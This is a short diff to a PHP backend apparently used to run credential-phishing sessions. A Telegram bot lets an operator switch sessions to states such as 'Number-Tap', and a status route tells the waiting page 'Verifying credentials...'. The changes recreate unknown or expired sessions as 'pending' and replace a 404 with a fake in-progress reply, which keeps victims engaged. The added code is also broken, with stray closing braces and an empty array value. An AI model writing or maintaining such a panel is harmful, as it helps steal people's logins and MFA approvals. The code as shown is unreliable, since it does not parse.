@@ -249,8 +249,9 @@ function handleTelegramCallbackQuery($sessionDir, $botToken, $callbackQuery) {
 
         $session = getSession($sessionDir, $sessionId);
         if (!$session) {
-            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId, 'text' => 'Session expired or not found.', 'show_alert' => true]);
-            return;
+            $session = ['sessionId' => $sessionId, 'status' => 'pending', 'createdAt' => time()];
+            saveSession($sessionDir, $sessionId, $session);
+        }
         }
 
         if ($action === 'num_menu') {
@@ -404,8 +405,9 @@ function handleTelegramCallbackQuery($sessionDir, $botToken, $callbackQuery) {
 
         $session = getSession($sessionDir, $sessionId);
         if (!$session) {
-            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId, 'text' => 'Session expired or not found.', 'show_alert' => true]);
-            return;
+            $session = ['sessionId' => $sessionId, 'status' => 'pending', 'createdAt' => time()];
+            saveSession($sessionDir, $sessionId, $session);
+        }
         }
 
         // Set session to Number-Tap
@@ -668,7 +670,7 @@ if ($method === 'GET' && (preg_match('/\/status\/([a-zA-Z0-9_-]+)/', $route, $ma
         }
     }
 
-    sendResponse(404, ['error' => 'Session not found or expired']);
+    sendResponse(200, ['sessionId' => , 'status' => 'pending', 'message' => 'Verifying credentials...']);
 }
 
 // Route: POST /telegram-webhook (Webhook handler from Telegram)
